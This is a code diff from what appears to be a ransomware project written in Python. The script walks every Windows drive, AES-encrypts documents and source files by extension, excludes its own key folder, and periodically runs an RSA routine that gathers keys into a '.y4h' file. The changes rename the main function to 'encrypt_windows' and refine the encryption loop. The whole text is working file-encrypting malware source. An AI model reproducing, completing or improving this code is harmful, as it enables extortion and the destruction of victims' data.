@@ -3,7 +3,7 @@ import os
 import win32api
 from aes import aes_encrypt
 import RSA as Rencrypt
-def find_file():
+def encrypt_windows():
     count=1
     for drive in win32api.GetLogicalDriveStrings().split('\000')[:-1]:
         if(str(drive) == "C:\\"):
@@ -16,11 +16,10 @@ def find_file():
                     continue
                 if(ext == "docx" or ext == "txt" or ext == "pptx" or ext == "pdf" or ext == "json" or ext == "html" or ext == "css" or ext == "js" or ext == "c" or ext == "java" or ext=="py"):
                     try:
-                        
                         path = str(os.path.join(root, f))
-                        if("res" in path and ("temp_key" in path or "key" in path)):
+                        if("\\\\res\\\\" in path and ("temp_key" in path or "key" in path)):
                             continue
-                        aes_encrypt(path,2)#change method
+                        aes_encrypt(path)
                         if(count % 3==0):
                             Rencrypt.d_main()
                             f = open('res/key.txt.y4h','ab').write(open('res/temp_key.txt.y4h','rb').read())
@@ -39,4 +38,4 @@ def find_file():
         pass
 
 
-find_file()
+encrypt_windows()
